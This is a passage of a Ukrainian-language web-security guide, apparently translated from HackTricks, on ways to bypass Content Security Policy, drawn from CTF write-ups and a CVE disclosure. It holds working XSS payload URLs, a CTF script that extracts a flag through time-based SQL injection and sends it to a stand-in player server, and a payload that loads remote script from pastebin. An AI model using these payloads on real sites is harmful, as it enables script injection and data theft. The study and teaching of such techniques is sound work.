–Ø–∫—â–æ **–ø–∞—Ä–∞–º–µ—Ç—Ä**, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∏–π –≤–∞–º–∏, **–≤—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—É** **–æ–≥–æ–ª–æ—à–µ–Ω–Ω—è** **–ø–æ–ª—ñ—Ç–∏–∫–∏**, —Ç–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏** **–ø–æ–ª—ñ—Ç–∏–∫—É** —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, —â–æ –≤–æ–Ω–∞ —Å—Ç–∞–Ω–µ **–Ω–µ–∫–æ—Ä–∏—Å–Ω–æ—é**. –í–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç—ñ–≤ 'unsafe-inline'** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –±—É–¥—å-—è–∫–æ–≥–æ –∑ —Ü–∏—Ö –æ–±—Ö—ñ–¥–Ω–∏—Ö —à–ª—è—Ö—ñ–≤:

```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```

–û—Å–∫—ñ–ª—å–∫–∏ —Ü—è –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ **–ø–µ—Ä–µ–∑–∞–ø–∏—à–µ —ñ—Å–Ω—É—é—á—ñ –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ script-src**.\
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ —Ç—É—Ç: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

–£ Edge –≤—Å–µ –Ω–∞–±–∞–≥–∞—Ç–æ –ø—Ä–æ—Å—Ç—ñ—à–µ. –Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –¥–æ–¥–∞—Ç–∏ –≤ CSP –ª–∏—à–µ —Ü–µ: **`;_`** **Edge** **–≤—ñ–¥–∫–∏–Ω–µ** –≤–µ—Å—å **–ø–æ–ª—ñ—Ç–∏–∫—É**.\
–ü—Ä–∏–∫–ª–∞–¥: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; —á–µ—Ä–µ–∑ XSS (iframe) - –ê—Ç–∞–∫–∞ —á–∞—Å–æ–º

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ `'unsafe-inline'`\
–¶—å–æ–≥–æ —Ä–∞–∑—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –∂–µ—Ä—Ç–≤—É **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø—ñ–¥ **–≤–∞—à–∏–º –∫–æ–Ω—Ç—Ä–æ–ª–µ–º** —á–µ—Ä–µ–∑ **XSS** –∑ –¥–æ–ø–æ–º–æ–≥–æ—é `<iframe`. –¶—å–æ–≥–æ —Ä–∞–∑—É –≤–∏ –∑–º—É—Å–∏—Ç–µ –∂–µ—Ä—Ç–≤—É –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Å—Ç–æ—Ä—ñ–Ω–∫–∏, –∑–≤—ñ–¥–∫–∏ –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é (**CSRF**). –í–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–º—ñ—Å—Ç—É —Å—Ç–æ—Ä—ñ–Ω–∫–∏, –∞–ª–µ —è–∫—â–æ –≤–∏ —è–∫–æ—Å—å –∑–º–æ–∂–µ—Ç–µ **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —á–∞—Å, —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.

–¶—å–æ–≥–æ —Ä–∞–∑—É **–ø—Ä–∞–ø–æ—Ä–µ—Ü—å** –±—É–¥–µ –≤–∏—Ç—è–≥–Ω—É—Ç–∏–π, –∫–æ–ª–∏ –±—É–¥–µ **–ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–≥–∞–¥–∞–Ω–æ —Å–∏–º–≤–æ–ª** —á–µ—Ä–µ–∑ SQLi, **–≤—ñ–¥–ø–æ–≤—ñ–¥—å** –∑–∞–π–º–µ **–±—ñ–ª—å—à–µ —á–∞—Å—É** —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—é –∑–∞—Ç—Ä–∏–º–∫–∏. –ü–æ—Ç—ñ–º –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å:

```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```

### –ß–µ—Ä–µ–∑ –∑–∞–∫–ª–∞–¥–∏–Ω–∫–∏

–¶–µ–π –∞—Ç–∞–∫–∞ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –¥–µ—è–∫–∏–π —Å–æ—Ü—ñ–∞–ª—å–Ω–∏–π —ñ–Ω–∂–µ–Ω–µ—Ä—ñ–Ω–≥, –¥–µ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ **–ø–µ—Ä–µ–∫–æ–Ω—É—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø–µ—Ä–µ—Ç—è–≥–Ω—É—Ç–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –∑–∞–∫–ª–∞–¥–∫—É –±—Ä–∞—É–∑–µ—Ä–∞**. –¶—è –∑–∞–∫–ª–∞–¥–∫–∞ –º—ñ—Å—Ç–∏—Ç–∏–º–µ **–∑–ª–æ–≤—ñ—Å–Ω–∏–π javascript** –∫–æ–¥, —è–∫–∏–π –ø—Ä–∏ –ø–µ—Ä–µ—Ç—è–≥—É–≤–∞–Ω–Ω—ñ –∞–±–æ –∫–ª—ñ–∫—É –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∏–π –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –≤–µ–±-–≤—ñ–∫–Ω–∞, **–æ–±—Ö—ñ–¥ CSP —Ç–∞ –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∫—Ä–∞—Å—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** —Ç–∞–∫—É —è–∫ —Ñ–∞–π–ª–∏ cookie –∞–±–æ —Ç–æ–∫–µ–Ω–∏.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó [**–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –∑–≤—ñ—Ç —Ç—É—Ç**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### –û–±—Ö—ñ–¥ CSP —à–ª—è—Ö–æ–º –æ–±–º–µ–∂–µ–Ω–Ω—è CSP

–£ [**—Ü—å–æ–º—É –æ–ø–∏—Å—ñ CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP –æ–±—Ö–æ–¥–∏—Ç—å—Å—è —à–ª—è—Ö–æ–º –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –≤ –¥–æ–∑–≤–æ–ª–µ–Ω—É iframe –±—ñ–ª—å—à –æ–±–º–µ–∂–µ–Ω–æ–≥–æ CSP, —è–∫–∏–π –∑–∞–±–æ—Ä–æ–Ω—è–≤ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø–µ–≤–Ω–æ–≥–æ JS —Ñ–∞–π–ª—É, —è–∫–∏–π –ø–æ—Ç—ñ–º, —á–µ—Ä–µ–∑ **–∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É** –∞–±–æ **–∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è DOM**, –¥–æ–∑–≤–æ–ª—è–≤ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —ñ–Ω—à–∏–º —Å–∫—Ä–∏–ø—Ç–æ–º –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç—É**.

–í–∏ –º–æ–∂–µ—Ç–µ **–æ–±–º–µ–∂–∏—Ç–∏ CSP Iframe** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∞—Ç—Ä–∏–±—É—Ç—É **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

–£ [**—Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ CTF**](https://github.com/aszx87410/ctf-writeups/issues/48), –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è HTML** **–æ–±–º–µ–∂–∏—Ç–∏** –±—ñ–ª—å—à–µ **CSP**, —â–æ–± —Å—Ü–µ–Ω–∞—Ä—ñ–π, —è–∫–∏–π –∑–∞–ø–æ–±—ñ–≥–∞—î CSTI, –±—É–≤ –≤–∏–º–∫–Ω–µ–Ω–∏–π, —ñ, –æ—Ç–∂–µ, **–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Å—Ç–∞–ª–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.**\
CSP –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –±—ñ–ª—å—à –æ–±–º–µ–∂–µ–Ω–∏–º –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–º–µ—Ç–∞-—Ç–µ–≥—ñ–≤ HTML**, –∞ –≤–±—É–¥–æ–≤–∞–Ω—ñ —Å—Ü–µ–Ω–∞—Ä—ñ—ó –º–æ–∂–Ω–∞ –≤–∏–º–∫–Ω—É—Ç–∏, **–≤–∏–¥–∞–ª–∏–≤—à–∏** **–∑–∞–ø–∏—Å**, —â–æ –¥–æ–∑–≤–æ–ª—è—î —ó—Ö **nonce** —Ç–∞ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –≤–±—É–¥–æ–≤–∞–Ω–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π —á–µ—Ä–µ–∑ sha**:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```

### JS –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Content-Security-Policy-Report-Only

–Ø–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫, —â–æ–± —Å–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–≤ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–º **`Content-Security-Policy-Report-Only`** –∑ **–∑–Ω–∞—á–µ–Ω–Ω—è–º, –∫–æ—Ç—Ä–µ –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –≤–∞–º–∏** (–º–æ–∂–ª–∏–≤–æ, —á–µ—Ä–µ–∑ CRLF), –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –≤–∞—à —Å–µ—Ä–≤–µ—Ä, —ñ —è–∫—â–æ –≤–∏ **–æ–±–≥–æ—Ä–Ω–µ—Ç–µ** **JS –≤–º—ñ—Å—Ç**, —è–∫–∏–π –≤–∏ —Ö–æ—á–µ—Ç–µ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –∑ **`<script>`**, —ñ –æ—Å–∫—ñ–ª—å–∫–∏ –π–º–æ–≤—ñ—Ä–Ω–æ `unsafe-inline` –Ω–µ –¥–æ–∑–≤–æ–ª—è—î—Ç—å—Å—è CSP, —Ü–µ —Å–ø—Ä–∏—á–∏–Ω–∏—Ç—å **–ø–æ–º–∏–ª–∫—É CSP**, —ñ —á–∞—Å—Ç–∏–Ω–∞ —Å–∫—Ä–∏–ø—Ç–∞ (—â–æ –º—ñ—Å—Ç–∏—Ç—å —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é) –±—É–¥–µ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑ `Content-Security-Policy-Report-Only`.

–î–ª—è –ø—Ä–∏–∫–ª–∞–¥—É [**–ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü–µ–π CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)

```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```

### –í–∏—Ç—ñ–∫ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é CSP —Ç–∞ Iframe

* –°—Ç–≤–æ—Ä—é—î—Ç—å—Å—è `iframe`, —è–∫–∏–π –≤–∫–∞–∑—É—î –Ω–∞ URL (–Ω–∞–∑–≤–µ–º–æ –π–æ–≥–æ `https://example.redirect.com`), —è–∫–∏–π –¥–æ–∑–≤–æ–ª–µ–Ω–∏–π CSP.
* –¶–µ–π URL –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è –Ω–∞ —Å–µ–∫—Ä–µ—Ç–Ω–∏–π URL (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `https://usersecret.example2.com`), —è–∫–∏–π **–Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–∏–π** CSP.
* –°–ª—É—Ö–∞—é—á–∏ –ø–æ–¥—ñ—é `securitypolicyviolation`, –º–æ–∂–Ω–∞ –∑–∞—Ö–æ–ø–∏—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `blockedURI`. –¶—è –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å —Ä–æ–∑–∫—Ä–∏–≤–∞—î –¥–æ–º–µ–Ω –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ–≥–æ URI, –≤–∏—Ç—ñ–∫–∞—é—á–∏ —Å–µ–∫—Ä–µ—Ç–Ω–∏–π –¥–æ–º–µ–Ω, –Ω–∞ —è–∫–∏–π —Å–ø–æ—á–∞—Ç–∫—É –±—É–ª–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–æ.

–¶—ñ–∫–∞–≤–æ –≤—ñ–¥–∑–Ω–∞—á–∏—Ç–∏, —â–æ –±—Ä–∞—É–∑–µ—Ä–∏, —Ç–∞–∫—ñ —è–∫ Chrome —Ç–∞ Firefox, –º–∞—é—Ç—å —Ä—ñ–∑–Ω—ñ –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ —É –≤—ñ–¥–Ω–æ—à–µ–Ω–Ω—ñ –¥–æ –æ–±—Ä–æ–±–∫–∏ iframes —É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ CSP, —â–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–≥–æ –≤–∏—Ç–æ–∫—É —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ –Ω–µ–≤–∏–∑–Ω–∞—á–µ–Ω–µ –ø–æ–≤–µ–¥—ñ–Ω–∫—É.

–©–µ –æ–¥–Ω–∏–º –º–µ—Ç–æ–¥–æ–º —î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∞–º–æ–≥–æ CSP –¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –ø—ñ–¥–¥–æ–º–µ–Ω—É. –¶–µ–π –º–µ—Ç–æ–¥ “ë—Ä—É–Ω—Ç—É—î—Ç—å—Å—è –Ω–∞ –∞–ª–≥–æ—Ä–∏—Ç–º—ñ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ –ø–æ—à—É–∫—É —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ CSP –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –¥–æ–º–µ–Ω—ñ–≤, —è–∫—ñ –Ω–∞–º—ñ—Ä–µ–Ω–æ –±–ª–æ–∫—É—é—Ç—å—Å—è. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ —Å–µ–∫—Ä–µ—Ç–Ω–∏–π –ø—ñ–¥–¥–æ–º–µ–Ω —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ –Ω–µ–≤—ñ–¥–æ–º–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤, –º–æ–∂–Ω–∞ —ñ—Ç–µ—Ä–∞—Ç–∏–≤–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ —Ä—ñ–∑–Ω—ñ –ø—ñ–¥–¥–æ–º–µ–Ω–∏, –∑–º—ñ–Ω—é—é—á–∏ –¥–∏—Ä–µ–∫—Ç–∏–≤—É CSP –¥–ª—è –±–ª–æ–∫—É–≤–∞–Ω–Ω—è –∞–±–æ –¥–æ–∑–≤–æ–ª—É —Ü–∏—Ö –ø—ñ–¥–¥–æ–º–µ–Ω—ñ–≤. –û—Å—å —É—Ä–∏–≤–æ–∫ –∫–æ–¥—É, —è–∫–∏–π –ø–æ–∫–∞–∑—É—î, —è–∫ –º–æ–∂–µ –±—É—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π CSP –¥–ª—è –ø–æ–ª–µ–≥—à–µ–Ω–Ω—è —Ü—å–æ–≥–æ –º–µ—Ç–æ–¥—É:

```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```

–ß–µ—Ä–µ–∑ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –∑–∞–ø–∏—Ç—ñ–≤, —è–∫—ñ –±–ª–æ–∫—É—é—Ç—å—Å—è –∞–±–æ –¥–æ–∑–≤–æ–ª—è—é—Ç—å—Å—è CSP, –º–æ–∂–Ω–∞ —Å–∫–æ—Ä–æ—Ç–∏—Ç–∏ –º–æ–∂–ª–∏–≤—ñ —Å–∏–º–≤–æ–ª–∏ –≤ —Å–µ–∫—Ä–µ—Ç–Ω–æ–º—É –ø—ñ–¥–¥–æ–º–µ–Ω—ñ, –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ —Ä–æ–∑–∫—Ä–∏–≤–∞—é—á–∏ –ø–æ–≤–Ω–∏–π URL.

–û–±–∏–¥–≤–∞ –º–µ—Ç–æ–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –Ω—é–∞–Ω—Å–∏ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó —Ç–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ CSP –≤ –±—Ä–∞—É–∑–µ—Ä–∞—Ö, –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—á–∏, —è–∫, –∑–¥–∞–≤–∞–ª–æ—Å—è –±, –±–µ–∑–ø–µ—á–Ω—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –º–æ–∂—É—Ç—å –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.

–•–∏—Ç –≤—ñ–¥ [**—Ç—É—Ç**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ –º–∏—Å–ª–∏–≤—Ü—è–º–∏ –∑–∞ –±–∞–≥–∞–º–∏!

**–Ü–Ω—Å–∞–π—Ç–∏ —â–æ–¥–æ –•–∞–∫—ñ–Ω–≥—É**\
–í–∑–∞—î–º–æ–¥—ñ–π—Ç–µ –∑ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, —è–∫–∏–π –¥–æ—Å–ª—ñ–¥–∂—É—î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ –•–∞–∫—ñ–Ω–≥ —É –†–µ–∞–ª—å–Ω–æ–º—É –ß–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–∑–º—ñ–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫—ñ–Ω–≥—É –∑–∞–≤–¥—è–∫–∏ –Ω–æ–≤–∏–Ω–∞–º —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∞–º —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –û–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–∞–π–Ω–æ–≤—ñ—à–∏—Ö –∑–∞–ø—É—Å–∫—ñ–≤ –±–∞–≥-–±–∞—É–Ω—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**Discord**](https://discord.com/invite/N3FrSbmwdy) —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ —Ç–æ–ø–æ–≤–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## –ù–µ–±–µ–∑–ø–µ—á–Ω—ñ –¢–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó –¥–ª—è –û–±—Ö—ñ–¥—É CSP

### –ü–µ—Ä–µ–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ PHP

PHP –≤—ñ–¥–æ–º–∏–π —Ç–∏–º, —â–æ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º **–±—É—Ñ–µ—Ä–∏–∑—É—î –≤—ñ–¥–ø–æ–≤—ñ–¥—å –¥–æ 4096** –±–∞–π—Ç—ñ–≤. –¢–æ–º—É, —è–∫—â–æ PHP –ø–æ–∫–∞–∑—É—î –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è, –Ω–∞–¥–∞—é—á–∏ **–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–∞–Ω–∏—Ö –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω—å**, **–≤—ñ–¥–ø–æ–≤—ñ–¥—å** –±—É–¥–µ **–≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞** **–ø–µ—Ä–µ–¥** **–∑–∞–≥–æ–ª–æ–≤–∫–æ–º CSP**, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —ñ–≥–Ω–æ—Ä—É–≤–∞–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞.\
–û—Ç–∂–µ, —Ç–µ—Ö–Ω—ñ–∫–∞ –ø–æ–ª—è–≥–∞—î –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –≤ **–∑–∞–ø–æ–≤–Ω–µ–Ω–Ω—ñ –±—É—Ñ–µ—Ä–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è–º–∏**, —â–æ–± –∑–∞–≥–æ–ª–æ–≤–æ–∫ CSP –Ω–µ –±—É–≤ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∏–π.

–Ü–¥–µ—è –≤—ñ–¥ [**—Ü—å–æ–≥–æ –æ–ø–∏—Å—É**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

